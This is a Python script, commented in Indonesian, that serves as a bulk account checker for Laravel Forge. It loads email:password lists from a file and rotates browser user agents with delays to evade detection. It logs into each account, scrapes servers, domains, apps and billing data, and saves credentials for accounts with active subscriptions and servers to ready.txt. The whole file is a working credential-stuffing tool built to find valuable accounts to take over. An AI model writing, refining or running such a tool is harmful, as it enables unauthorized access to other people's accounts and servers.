#!/usr/bin/env python3
"""
Laravel Forge Auto Login - Subscription Checker (Enhanced v3)
Automatically login to Laravel Forge and check subscription status
Support untuk multiple credentials dari file dengan rotating user agent dan delay
Auto-save ke ready.txt jika ada subscription + server + domain
"""

import requests
import json
import time
import random
import os
import threading
from bs4 import BeautifulSoup
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from datetime import datetime
from urllib.parse import urljoin

# User Agents untuk rotating
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
]

# Lock untuk file operations
file_lock = threading.Lock()

class ForgeChecker:
    def __init__(self, check_delay=3):
        self.session = None
        self.base_url = "https://forge.laravel.com"
        self.csrf_token = None
        self.check_delay = check_delay
        self.current_user_agent = None
        
    def _get_random_user_agent(self):
        """Get random user agent dari list"""
        return random.choice(USER_AGENTS)
    
    def _create_session(self):
        """Create a session with retry strategy dan random user agent"""
        session = requests.Session()
        retry_strategy = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["HEAD", "GET", "POST"]
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        # Set random user agent
        self.current_user_agent = self._get_random_user_agent()
        session.headers.update({
            "User-Agent": self.current_user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        })
        return session
    
    def _refresh_session(self):
        """Refresh session dengan user agent baru"""
        self.session = self._create_session()
        print(f"[→] New User-Agent: {self.current_user_agent[:60]}...")
    
    def get_csrf_token(self):
        """Get CSRF token from sign-in page"""
        try:
            response = self.session.get(f"{self.base_url}/sign-in", timeout=10)
            response.raise_for_status()
            
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Method 1: Cari dari meta tag
            csrf_meta = soup.find('meta', {'name': 'csrf-token'})
            if csrf_meta:
                self.csrf_token = csrf_meta.get('value')
                print("[✓] CSRF token obtained from meta tag")
                return self.csrf_token
            
            # Method 2: Cari dari input hidden _token
            csrf_input = soup.find('input', {'name': '_token'})
            if csrf_input:
                self.csrf_token = csrf_input.get('value')
                print("[✓] CSRF token obtained from form input")
                return self.csrf_token
            
            # Method 3: Cari X-CSRF-TOKEN dari meta
            csrf_meta2 = soup.find('meta', {'name': 'X-CSRF-TOKEN'})
            if csrf_meta2:
                self.csrf_token = csrf_meta2.get('content')
                print("[✓] CSRF token obtained from X-CSRF-TOKEN meta")
                return self.csrf_token
            
            # Method 4: Extract dari inline JavaScript (jika ada)
            scripts = soup.find_all('script')
            for script in scripts:
                if script.string and 'csrf' in script.string.lower():
                    import re
                    match = re.search(r'["\']csrf["\']?\s*:\s*["\']([a-zA-Z0-9/+=]+)["\']', script.string)
                    if match:
                        self.csrf_token = match.group(1)
                        print("[✓] CSRF token obtained from JavaScript")
                        return self.csrf_token
            
            print("[!] CSRF token tidak ditemukan - akan coba login tanpa CSRF")
            return None
            
        except Exception as e:
            print(f"[✗] Error getting CSRF token: {e}")
            return None
    
    def login(self, email, password, remember=False):
        """Login to Laravel Forge"""
        try:
            # Refresh session dengan user agent baru
            self._refresh_session()
            
            # Get CSRF token first
            if not self.get_csrf_token():
                print("[!] Melanjutkan tanpa CSRF token...")
            
            # Prepare login payload
            payload = {
                "email": email,
                "password": password,
                "remember": remember
            }
            
            if self.csrf_token:
                payload["_token"] = self.csrf_token
            
            print(f"\n[→] Attempting login dengan email: {email}")
            print(f"[→] CSRF Token: {'Ada' if self.csrf_token else 'Tidak'}")
            
            # Try POST dengan JSON
            headers = {
                "X-Requested-With": "XMLHttpRequest",
                "Accept": "application/json"
            }
            if self.csrf_token:
                headers["X-CSRF-TOKEN"] = self.csrf_token
            
            print("[→] Mencoba request dengan JSON...")
            response = self.session.post(
                f"{self.base_url}/sign-in",
                json=payload,
                headers=headers,
                allow_redirects=True,
                timeout=10
            )
            
            print(f"[*] Status Code: {response.status_code}")
            print(f"[*] URL setelah redirect: {response.url}")
            
            # Check if login was successful
            if response.status_code == 200:
                if any(keyword in response.url.lower() for keyword in ["dashboard", "/servers", "/apps", "/providers"]):
                    print("[✓] Login berhasil!")
                    return True
                elif "sign-in" not in response.url:
                    print("[✓] Login berhasil!")
                    return True
            
            # Try alternative approach - form-encoded POST
            print("\n[→] Mencoba request dengan form-encoded...")
            
            form_payload = {
                "email": email,
                "password": password,
                "remember": "on" if remember else None
            }
            if self.csrf_token:
                form_payload["_token"] = self.csrf_token
            
            form_payload = {k: v for k, v in form_payload.items() if v is not None}
            
            response2 = self.session.post(
                f"{self.base_url}/sign-in",
                data=form_payload,
                allow_redirects=True,
                timeout=10
            )
            
            print(f"[*] Status Code: {response2.status_code}")
            print(f"[*] URL setelah redirect: {response2.url}")
            
            if response2.status_code == 200:
                if any(keyword in response2.url.lower() for keyword in ["dashboard", "/servers", "/apps"]):
                    print("[✓] Login berhasil (form-encoded)!")
                    return True
                elif "sign-in" not in response2.url:
                    print("[✓] Login berhasil (form-encoded)!")
                    return True
            
            print("[✗] Login gagal - masih di halaman sign-in atau autentikasi ditolak")
            if response.status_code == 422 or response2.status_code == 422:
                print("[!] Error 422: Validasi gagal - cek email/password")
            return False
                
        except Exception as e:
            print(f"[✗] Error during login: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    def get_servers_data(self):
        """Get detailed servers data"""
        servers_data = []
        
        try:
            print("[→] Trying API endpoint for servers...")
            # Try API endpoint first
            try:
                api_response = self.session.get(
                    f"{self.base_url}/api/servers",
                    headers={"Accept": "application/json"},
                    timeout=10
                )
                print(f"[*] API Response Status: {api_response.status_code}")
                
                if api_response.status_code == 200:
                    try:
                        api_data = api_response.json()
                        print(f"[DEBUG] API Data: {json.dumps(api_data)[:200]}")
                        
                        if isinstance(api_data, dict) and 'data' in api_data:
                            for server in api_data['data']:
                                servers_data.append({
                                    "name": server.get('name', 'Unknown'),
                                    "provider": server.get('provider', ''),
                                    "region": server.get('region', ''),
                                    "ip": server.get('ip_address', ''),
                                    "size": server.get('size', ''),
                                    "os": server.get('os', ''),
                                    "php_version": server.get('php_version', ''),
                                    "type": "api"
                                })
                        elif isinstance(api_data, list):
                            for server in api_data:
                                servers_data.append({
                                    "name": server.get('name', 'Unknown'),
                                    "provider": server.get('provider', ''),
                                    "region": server.get('region', ''),
                                    "ip": server.get('ip_address', ''),
                                    "size": server.get('size', ''),
                                    "os": server.get('os', ''),
                                    "php_version": server.get('php_version', ''),
                                    "type": "api"
                                })
                        
                        if servers_data:
                            print(f"[✓] Got {len(servers_data)} server(s) from API")
                    except json.JSONDecodeError:
                        print("[!] API response bukan JSON, coba scraping...")
            except Exception as e:
                print(f"[!] API endpoint failed: {e}")
            
            # If no data from API, try web scraping
            if not servers_data:
                print("[→] Trying web scraping for servers...")
                response = self.session.get(f"{self.base_url}/servers", timeout=10)
                print(f"[*] Scraping Response Status: {response.status_code}")
                
                if response.status_code == 200:
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    # Debug: print page title
                    title = soup.find('title')
                    print(f"[*] Page Title: {title.get_text() if title else 'No title'}")
                    
                    # Cari semua text yang mungkin server names
                    all_text = soup.get_text()
                    print(f"[DEBUG] Page length: {len(all_text)} chars")
                    
                    # Method 1: Cari dari table
                    print("[→] Looking for servers in tables...")
                    tables = soup.find_all('table')
                    print(f"[*] Found {len(tables)} table(s)")
                    
                    for table_idx, table in enumerate(tables):
                        rows = table.find_all('tr')
                        print(f"[*] Table {table_idx} has {len(rows)} rows")
                        
                        for row_idx, row in enumerate(rows[1:], 1):  # Skip header
                            cells = row.find_all(['td', 'th'])
                            if cells and len(cells) > 0:
                                server_name = cells[0].get_text(strip=True)
                                print(f"[*] Row {row_idx}: {server_name}")
                                
                                if server_name and len(server_name) > 1 and not any(x in server_name.lower() for x in ['server', 'name', 'provider']):
                                    server_info = {
                                        "name": server_name,
                                        "type": "table"
                                    }
                                    
                                    # Extract more info jika ada
                                    if len(cells) > 1:
                                        server_info["provider"] = cells[1].get_text(strip=True)
                                    if len(cells) > 2:
                                        server_info["region"] = cells[2].get_text(strip=True)
                                    if len(cells) > 3:
                                        server_info["ip"] = cells[3].get_text(strip=True)
                                    
                                    servers_data.append(server_info)
                    
                    # Method 2: Cari dari cards/divs
                    print("[→] Looking for servers in cards...")
                    server_cards = soup.find_all(['div', 'li'], class_=lambda x: x and ('server' in str(x).lower() or 'card' in str(x).lower()))
                    print(f"[*] Found {len(server_cards)} card(s)")
                    
                    for card in server_cards[:10]:  # Limit to first 10
                        texts = [t.strip() for t in card.get_text(strip=True).split('\n') if t.strip() and len(t.strip()) > 2]
                        if texts:
                            server_name = texts[0]
                            print(f"[*] Card: {server_name}")
                            
                            if server_name and server_name not in [s.get('name') for s in servers_data]:
                                servers_data.append({
                                    "name": server_name,
                                    "type": "card"
                                })
            
            print(f"[✓] Total servers found: {len(servers_data)}")
            return servers_data
        
        except Exception as e:
            print(f"[✗] Error getting servers: {e}")
            import traceback
            traceback.print_exc()
            return servers_data
    
    def get_domains_data(self):
        """Get detailed domains data"""
        domains_data = []
        
        try:
            print("[→] Trying API endpoint for domains...")
            # Try API endpoint first
            try:
                api_response = self.session.get(
                    f"{self.base_url}/api/domains",
                    headers={"Accept": "application/json"},
                    timeout=10
                )
                print(f"[*] API Response Status: {api_response.status_code}")
                
                if api_response.status_code == 200:
                    try:
                        api_data = api_response.json()
                        print(f"[DEBUG] API Data: {json.dumps(api_data)[:200]}")
                        
                        if isinstance(api_data, dict) and 'data' in api_data:
                            for domain in api_data['data']:
                                domains_data.append({
                                    "domain": domain.get('domain', 'Unknown'),
                                    "server": domain.get('server', ''),
                                    "status": domain.get('status', ''),
                                    "ssl": domain.get('ssl', ''),
                                    "type": "api"
                                })
                        elif isinstance(api_data, list):
                            for domain in api_data:
                                domains_data.append({
                                    "domain": domain.get('domain', 'Unknown'),
                                    "server": domain.get('server', ''),
                                    "status": domain.get('status', ''),
                                    "ssl": domain.get('ssl', ''),
                                    "type": "api"
                                })
                        
                        if domains_data:
                            print(f"[✓] Got {len(domains_data)} domain(s) from API")
                    except json.JSONDecodeError:
                        print("[!] API response bukan JSON, coba scraping...")
            except Exception as e:
                print(f"[!] API endpoint failed: {e}")
            
            # If no data from API, try web scraping
            if not domains_data:
                print("[→] Trying web scraping for domains...")
                response = self.session.get(f"{self.base_url}/domains", timeout=10)
                print(f"[*] Scraping Response Status: {response.status_code}")
                
                if response.status_code == 200:
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    # Debug: print page title
                    title = soup.find('title')
                    print(f"[*] Page Title: {title.get_text() if title else 'No title'}")
                    
                    # Method 1: Cari dari table
                    print("[→] Looking for domains in tables...")
                    tables = soup.find_all('table')
                    print(f"[*] Found {len(tables)} table(s)")
                    
                    for table_idx, table in enumerate(tables):
                        rows = table.find_all('tr')
                        print(f"[*] Table {table_idx} has {len(rows)} rows")
                        
                        for row_idx, row in enumerate(rows[1:], 1):  # Skip header
                            cells = row.find_all(['td', 'th'])
                            if cells and len(cells) > 0:
                                domain_name = cells[0].get_text(strip=True)
                                print(f"[*] Row {row_idx}: {domain_name}")
                                
                                if domain_name and '.' in domain_name:  # Likely a domain
                                    domain_info = {
                                        "domain": domain_name,
                                        "type": "table"
                                    }
                                    
                                    if len(cells) > 1:
                                        domain_info["server"] = cells[1].get_text(strip=True)
                                    if len(cells) > 2:
                                        domain_info["status"] = cells[2].get_text(strip=True)
                                    
                                    domains_data.append(domain_info)
                    
                    # Method 2: Cari dari cards/divs
                    print("[→] Looking for domains in cards...")
                    domain_cards = soup.find_all(['div', 'li'], class_=lambda x: x and ('domain' in str(x).lower() or 'card' in str(x).lower()))
                    print(f"[*] Found {len(domain_cards)} card(s)")
                    
                    for card in domain_cards[:10]:  # Limit to first 10
                        texts = [t.strip() for t in card.get_text(strip=True).split('\n') if t.strip() and len(t.strip()) > 2]
                        if texts:
                            domain_name = texts[0]
                            print(f"[*] Card: {domain_name}")
                            
                            if domain_name and '.' in domain_name:
                                if domain_name not in [d.get('domain') for d in domains_data]:
                                    domains_data.append({
                                        "domain": domain_name,
                                        "type": "card"
                                    })
            
            print(f"[✓] Total domains found: {len(domains_data)}")
            return domains_data
        
        except Exception as e:
            print(f"[✗] Error getting domains: {e}")
            import traceback
            traceback.print_exc()
            return domains_data
    
    def get_apps_data(self):
        """Get detailed apps data"""
        apps_data = []
        
        try:
            print("[→] Trying API endpoint for apps...")
            # Try API endpoint
            try:
                api_response = self.session.get(
                    f"{self.base_url}/api/apps",
                    headers={"Accept": "application/json"},
                    timeout=10
                )
                print(f"[*] API Response Status: {api_response.status_code}")
                
                if api_response.status_code == 200:
                    try:
                        api_data = api_response.json()
                        if isinstance(api_data, dict) and 'data' in api_data:
                            for app in api_data['data']:
                                apps_data.append({
                                    "name": app.get('name', 'Unknown'),
                                    "domain": app.get('domain', ''),
                                    "server": app.get('server', ''),
                                    "repository": app.get('repository', ''),
                                    "type": "api"
                                })
                        elif isinstance(api_data, list):
                            for app in api_data:
                                apps_data.append({
                                    "name": app.get('name', 'Unknown'),
                                    "domain": app.get('domain', ''),
                                    "server": app.get('server', ''),
                                    "repository": app.get('repository', ''),
                                    "type": "api"
                                })
                        
                        if apps_data:
                            print(f"[✓] Got {len(apps_data)} app(s) from API")
                    except json.JSONDecodeError:
                        print("[!] API response bukan JSON")
            except Exception as e:
                print(f"[!] API endpoint failed: {e}")
        
        except Exception as e:
            print(f"[!] Error getting apps: {e}")
        
        print(f"[✓] Total apps found: {len(apps_data)}")
        return apps_data
    
    def get_subscription_data(self):
        """Get detailed subscription data"""
        subscription_data = {}
        
        try:
            print("[→] Fetching subscription details...")
            response = self.session.get(f"{self.base_url}/account/billing", timeout=10)
            print(f"[*] Response Status: {response.status_code}")
            
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Parse subscription info
                all_text = soup.get_text()
                print(f"[*] Page length: {len(all_text)} chars")
                
                # Cari subscription status
                subscription_found = False
                for elem in soup.find_all(['div', 'p', 'span', 'h1', 'h2', 'h3', 'li', 'strong']):
                    text = elem.get_text(strip=True)
                    
                    if 'subscription' in text.lower():
                        subscription_data['subscription_status'] = text
                        subscription_found = True
                        print(f"[*] Subscription text: {text[:100]}")
                    
                    if 'plan' in text.lower() and len(text) < 100:
                        subscription_data['plan'] = text
                        print(f"[*] Plan: {text}")
                    
                    if 'active' in text.lower() and len(text) < 100:
                        subscription_data['status'] = text
                        print(f"[*] Status: {text}")
                    
                    if any(plan in text.lower() for plan in ['pro', 'business', 'basic', 'starter']):
                        if len(text) < 100:
                            subscription_data['plan_type'] = text
                            print(f"[*] Plan Type: {text}")
                
                # Try API endpoint
                try:
                    api_response = self.session.get(
                        f"{self.base_url}/api/subscription",
                        headers={"Accept": "application/json"},
                        timeout=10
                    )
                    if api_response.status_code == 200:
                        try:
                            api_data = api_response.json()
                            subscription_data['api_subscription'] = api_data
                            subscription_found = True
                            print(f"[*] API Subscription: {json.dumps(api_data)[:100]}")
                        except:
                            pass
                except:
                    pass
                
                if subscription_found:
                    subscription_data['has_subscription'] = True
                else:
                    subscription_data['has_subscription'] = False
                    print("[!] Tidak menemukan subscription data")
        
        except Exception as e:
            print(f"[!] Error getting subscription: {e}")
            subscription_data['has_subscription'] = False
        
        return subscription_data
    
    def check_subscription(self):
        """Check subscription status after login"""
        try:
            print("\n[→] Fetching complete subscription & server info...\n")
            
            # Get all data
            servers = self.get_servers_data()
            print()
            
            domains = self.get_domains_data()
            print()
            
            apps = self.get_apps_data()
            print()
            
            subscription = self.get_subscription_data()
            print()
            
            subscription_info = {
                "logged_in": True,
                "servers": servers,
                "total_servers": len(servers),
                "domains": domains,
                "total_domains": len(domains),
                "apps": apps,
                "total_apps": len(apps),
                "subscription": subscription
            }
            
            print(f"[✓] Summary - Servers: {len(servers)}, Domains: {len(domains)}, Apps: {len(apps)}")
            print("[✓] Complete data fetch completed\n")
            return subscription_info
            
        except Exception as e:
            print(f"[✗] Error checking subscription: {e}")
            import traceback
            traceback.print_exc()
            return None
    
    def check_account(self, email, password, remember=False):
        """Main method: login dan check subscription"""
        print(f"\n{'=' * 70}")
        print(f"Laravel Forge Account Checker - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{'=' * 70}")
        
        if not self.login(email, password, remember):
            return {"status": "failed", "message": "Login gagal"}
        
        time.sleep(1)
        
        subscription = self.check_subscription()
        
        result = {
            "status": "success",
            "email": email,
            "subscription": subscription,
            "checked_at": datetime.now().isoformat()
        }
        
        return result


def save_to_ready_file(email, password, data, output_file="ready.txt"):
    """Save ready credentials to file (thread-safe)"""
    # Check if has subscription, server, and domain
    has_subscription = (
        data.get('subscription') and 
        data['subscription'].get('subscription') and
        data['subscription']['subscription'].get('has_subscription')
    )
    has_servers = (
        data.get('subscription') and 
        data['subscription'].get('total_servers', 0) > 0
    )
    has_domains = (
        data.get('subscription') and 
        data['subscription'].get('total_domains', 0) > 0
    )
    
    print(f"\n[DEBUG] Checking save conditions:")
    print(f"  - has_subscription: {has_subscription}")
    print(f"  - has_servers: {has_servers}")
    print(f"  - has_domains: {has_domains}")
    
    if has_subscription and has_servers and has_domains:
        with file_lock:
            try:
                # Prepare data to save
                save_data = {
                    "email": email,
                    "password": password,
                    "servers": data['subscription'].get('total_servers', 0),
                    "domains": data['subscription'].get('total_domains', 0),
                    "apps": data['subscription'].get('total_apps', 0),
                    "timestamp": datetime.now().isoformat()
                }
                
                # Append to file
                with open(output_file, 'a') as f:
                    f.write(json.dumps(save_data) + '\n')
                
                print(f"\n[💾] ✅ SAVED TO {output_file}: {email}")
                print(f"     Servers: {save_data['servers']}, Domains: {save_data['domains']}, Apps: {save_data['apps']}")
                return True
            except Exception as e:
                print(f"[✗] Error saving to file: {e}")
                return False
    else:
        print(f"[✗] Not saved - Missing: ", end="")
        if not has_subscription:
            print("subscription ", end="")
        if not has_servers:
            print("servers ", end="")
        if not has_domains:
            print("domains ", end="")
        print()
    
    return False


def load_credentials_from_file(file_path):
    """Load credentials dari file dengan format email:password"""
    credentials = []
    
    if not os.path.exists(file_path):
        print(f"[✗] File tidak ditemukan: {file_path}")
        return credentials
    
    try:
        with open(file_path, 'r') as f:
            for line_num, line in enumerate(f, 1):
                line = line.strip()
                
                if not line or line.startswith('#'):
                    continue
                
                if ':' not in line:
                    print(f"[!] Baris {line_num}: Format salah (gunakan email:password) - '{line}'")
                    continue
                
                parts = line.split(':', 1)
                if len(parts) != 2:
                    print(f"[!] Baris {line_num}: Format salah - '{line}'")
                    continue
                
                email, password = parts
                email = email.strip()
                password = password.strip()
                
                if not email or not password:
                    print(f"[!] Baris {line_num}: Email atau password kosong")
                    continue
                
                credentials.append({
                    "email": email,
                    "password": password,
                    "remember": False
                })
                print(f"[✓] Baris {line_num}: {email} - loaded")
        
        print(f"\n[✓] Total {len(credentials)} credential(s) loaded dari {file_path}\n")
        return credentials
        
    except Exception as e:
        print(f"[✗] Error loading file: {e}")
        return credentials


def save_results_to_file(results, output_file="forge_results.json"):
    """Save results to JSON file"""
    try:
        with open(output_file, 'w') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        print(f"\n[✓] Results saved to: {output_file}")
    except Exception as e:
        print(f"[✗] Error saving results: {e}")


def main():
    """Main function"""
    print("\n" + "=" * 70)
    print("Laravel Forge Login Checker - Batch Mode (Enhanced v3 - Debug)")
    print("=" * 70 + "\n")
    
    while True:
        print("[1] Load credentials dari file")
        print("[2] Input manual")
        print("[3] Exit")
        
        mode = input("\nPilih mode (1-3): ").strip()
        
        if mode == "3":
            print("\n[✓] Terima kasih! Sampai jumpa.\n")
            break
        
        if mode == "1":
            file_path = input("📁 Masukkan path file (contoh: credentials.txt): ").strip()
            
            if not file_path:
                print("[!] Path tidak boleh kosong\n")
                continue
            
            credentials = load_credentials_from_file(file_path)
            
            if not credentials:
                print("[!] Tidak ada credentials yang valid\n")
                continue
            
            # Input delay
            try:
                delay_input = input("⏱️  Delay antar pengecekan (detik, default: 3): ").strip()
                check_delay = int(delay_input) if delay_input else 3
            except ValueError:
                check_delay = 3
                print(f"[!] Delay invalid, menggunakan default: {check_delay} detik")
            
            # Ask to enable remember
            remember_input = input("💾 Ingat saya untuk semua akun? (y/n, default: n): ").strip().lower()
            remember = remember_input == 'y'
            
            print(f"\n[→] Starting batch check...")
            print(f"[→] Total akun: {len(credentials)}")
            print(f"[→] Delay: {check_delay} detik")
            print(f"[→] Remember: {'Ya' if remember else 'Tidak'}\n")
            
            checker = ForgeChecker(check_delay=check_delay)
            results = []
            
            for idx, cred in enumerate(credentials, 1):
                print(f"\n{'=' * 70}")
                print(f"Checking Account {idx}/{len(credentials)}")
                print(f"{'=' * 70}")
                
                result = checker.check_account(
                    email=cred['email'],
                    password=cred['password'],
                    remember=remember
                )
                
                results.append(result)
                
                print("\n" + "-" * 70)
                print("RESULT SUMMARY:")
                print(f"Status: {result['status']}")
                if result['status'] == 'success':
                    print(f"Servers: {result['subscription']['total_servers']}")
                    print(f"Domains: {result['subscription']['total_domains']}")
                    print(f"Apps: {result['subscription']['total_apps']}")
                else:
                    print(f"Message: {result.get('message', 'Unknown error')}")
                print("-" * 70)
                
                # Auto-save to ready.txt if has subscription, servers, and domains
                if result['status'] == 'success':
                    save_to_ready_file(cred['email'], cred['password'], result, "ready.txt")
                
                # Delay sebelum pengecekan berikutnya
                if idx < len(credentials):
                    print(f"\n[⏳] Waiting {check_delay} seconds before next check...")
                    for i in range(check_delay, 0, -1):
                        print(f"[⏳] {i} seconds remaining...", end='\r')
                        time.sleep(1)
                    print(" " * 40, end='\r')
            
            # Save results
            print(f"\n{'=' * 70}")
            print("BATCH CHECK COMPLETED")
            print(f"{'=' * 70}")
            
            summary = {
                "total_accounts": len(credentials),
                "success": len([r for r in results if r['status'] == 'success']),
                "failed": len([r for r in results if r['status'] == 'failed']),
                "checked_at": datetime.now().isoformat(),
            }
            
            print(f"Total: {summary['total_accounts']}")
            print(f"Success: {summary['success']}")
            print(f"Failed: {summary['failed']}")
            
            save_option = input("\n💾 Simpan hasil detail? (y/n): ").strip().lower()
            if save_option == 'y':
                output_file = input("📁 Nama file output (default: forge_results.json): ").strip()
                if not output_file:
                    output_file = "forge_results.json"
                save_results_to_file(summary, output_file)
        
        elif mode == "2":
            checker = ForgeChecker()
            
            while True:
                email = input("\n📧 Masukkan email: ").strip()
                if not email:
                    print("[!] Email tidak boleh kosong\n")
                    continue
                
                password = input("🔐 Masukkan password: ").strip()
                if not password:
                    print("[!] Password tidak boleh kosong\n")
                    continue
                
                remember_input = input("💾 Ingat saya? (y/n, default: n): ").strip().lower()
                remember = remember_input == 'y'
                
                result = checker.check_account(
                    email=email,
                    password=password,
                    remember=remember
                )
                
                print("\n" + "=" * 70)
                print("RESULT SUMMARY:")
                print(f"Status: {result['status']}")
                if result['status'] == 'success':
                    print(f"Servers: {result['subscription']['total_servers']}")
                    print(f"Domains: {result['subscription']['total_domains']}")
                    print(f"Apps: {result['subscription']['total_apps']}")
                else:
                    print(f"Message: {result.get('message', 'Unknown error')}")
                print("=" * 70 + "\n")
                
                # Auto-save to ready.txt if valid
                if result['status'] == 'success':
                    save_to_ready_file(email, password, result, "ready.txt")
                
                lagi = input("Cek akun lain? (y/n): ").strip().lower()
                if lagi != 'y':
                    break
        
        else:
            print("[!] Pilihan tidak valid\n")


if __name__ == "__main__":
    main()
